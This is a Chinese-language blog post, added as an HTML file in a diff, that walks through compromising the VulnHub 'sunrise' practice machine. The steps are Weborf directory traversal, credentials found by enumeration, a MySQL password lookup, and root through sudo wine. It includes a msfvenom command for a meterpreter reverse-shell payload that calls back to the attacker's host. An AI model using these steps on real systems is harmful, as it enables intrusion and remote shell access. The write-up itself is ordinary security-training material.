@@ -1,0 +1,187 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8" >
+
+<title> [vulnhub]sunrise靶机 | 过客</title>
+<meta name="description" content="this is a test Web">
+
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+
+<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.2/css/all.css" integrity="sha384-fnmOCqbTlWIlj8LyTjo7mOUStjsKC4pOpQbqyi7RrhN7udi9RwhKkMHpvLbHG9Sr" crossorigin="anonymous">
+<link rel="shortcut icon" href="https://guokeya.github.io/favicon.ico?v=1582185509296">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+<link rel="stylesheet" href="https://guokeya.github.io/styles/main.css">
+
+
+
+<script src="https://cdn.jsdelivr.net/npm/vue/dist/vue.js"></script>
+<script src="https://cdn.bootcss.com/highlight.js/9.12.0/highlight.min.js"></script>
+
+<link rel="stylesheet" href="https://unpkg.com/aos@next/dist/aos.css" />
+
+
+
+  </head>
+  <body>
+    <div id="app" class="main">
+
+      <div class="sidebar" :class="{ 'full-height': menuVisible }">
+  <div class="top-container" data-aos="fade-right">
+    <div class="top-header-container">
+      <a class="site-title-container" href="https://guokeya.github.io">
+        <img src="https://guokeya.github.io/images/avatar.png?v=1582185509296" class="site-logo">
+        <h1 class="site-title">过客</h1>
+      </a>
+      <div class="menu-btn" @click="menuVisible = !menuVisible">
+        <div class="line"></div>
+      </div>
+    </div>
+    <div>
+      
+        
+          <a href="/" class="site-nav">
+            首页
+          </a>
+        
+      
+        
+          <a href="/archives" class="site-nav">
+            归档
+          </a>
+        
+      
+        
+          <a href="/post/about" class="site-nav">
+            关于
+          </a>
+        
+      
+        
+          <a href="/tags" class="site-nav">
+            分类
+          </a>
+        
+      
+    </div>
+  </div>
+  <div class="bottom-container" data-aos="flip-up" data-aos-offset="0">
+    <div class="social-container">
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    </div>
+    <div class="site-description">
+      this is a test Web
+    </div>
+    <div class="site-footer">
+       | <a class="rss" href="https://guokeya.github.io/atom.xml" target="_blank">RSS</a>
+    </div>
+  </div>
+</div>
+
+
+      <div class="main-container">
+        <div class="content-container" data-aos="fade-up">
+          <div class="post-detail">
+            <h2 class="post-title"> [vulnhub]sunrise靶机</h2>
+            <div class="post-date">2020-02-05</div>
+            
+            <div class="post-content">
+              <p>开放端口22/80/3306/8080<br>
+<img src="https://guokeya.github.io/post-images/1580896853991.png" alt="" loading="lazy"></p>
+<!-- more -->
+<pre><code>22/tcp   open  ssh        OpenSSH 7.9p1 Debian 10+deb10u1 (protocol 2.0)
+80/tcp   open  http       Apache httpd 2.4.38
+3306/tcp open  mysql?
+8080/tcp open  http-proxy Weborf (GNU/Linux)
+</code></pre>
+<p>80端口啥也没有。看下8080weborf有没有什么漏洞<br>
+<img src="https://guokeya.github.io/post-images/1580897081350.png" alt="" loading="lazy"><br>
+看下目录穿越漏洞<br>
+存在weborf和sunrise用户。<br>
+<img src="https://guokeya.github.io/post-images/1580897146142.png" alt="" loading="lazy"><br>
+翻了下没什么东西。<br>
+<img src="https://guokeya.github.io/post-images/1580897211833.png" alt="" loading="lazy"><br>
+干脆用dirb扫。主要扫用户目录下的隐藏文件。<br>
+<img src="https://guokeya.github.io/post-images/1580897292466.png" alt="" loading="lazy"><br>
+<img src="https://guokeya.github.io/post-images/1580897325793.png" alt="" loading="lazy"><br>
+得到密码。weborf:iheartrainbows44<br>
+mysql登不上应该只能本地登陆。尝试ssh。成功登陆<br>
+继续信息搜集。内核版本。web目录。suid提权。sudo。都没什么好东西<br>
+之前的mysql是因为host不被允许而禁止登陆。并不是密码错误。<br>
+这时候本地登陆下试试，成功。并在user表中。发现一个特殊的密码。<br>
+<img src="https://guokeya.github.io/post-images/1580897520524.png" alt="" loading="lazy"><br>
+猜测这就是sunrise用户的明文。<br>
+果然如此。登陆上了<br>
+<img src="https://guokeya.github.io/post-images/1580897563187.png" alt="" loading="lazy"><br>
+可以root权限执行wine。wine用于Linux执行windows下的exe<br>
+用msf生成个exe后门。sudo wine执行。就会返回root权限的shell</p>
+<pre><code>msfvenom -p windows/meterpreter/reverse_tcp -f exe  LHOST=192.168.0.185 LPORT=6666 -o payload.exe
+scp payload.exe sunrise@192.168.0.184:/tmp
+</code></pre>
+<p>msf配置如下<br>
+<img src="https://guokeya.github.io/post-images/1580897688300.png" alt="" loading="lazy"><br>
+kali：exploit<br>
+靶机：sudo wine payload.exe<br>
+<img src="https://guokeya.github.io/post-images/1580897893686.png" alt="" loading="lazy"></p>
+
+            </div>
+            
+              <div class="tag-container">
+                
+                  <a href="https://guokeya.github.io/tag/EfzSPkBWE/" class="tag">
+                    渗透测试
+                  </a>
+                
+              </div>
+            
+            
+              <div class="next-post">
+                <div class="next">下一篇</div>
+                <a href="https://guokeya.github.io/post/vulnhubfive86-2-ba-ji/">
+                  <h3 class="post-title">
+                    [vulnhub]Five86-2靶机
+                  </h3>
+                </a>
+              </div>
+            
+
+            
+
+          </div>
+
+        </div>
+      </div>
+    </div>
+
+    <script src="https://unpkg.com/aos@next/dist/aos.js"></script>
+
+<script type="application/javascript">
+
+AOS.init();
+
+hljs.initHighlightingOnLoad()
+
+var app = new Vue({
+  el: '#app',
+  data: {
+    menuVisible: false,
+  },
+})
+
+</script>
+
+
+
+
+  </body>
+</html>
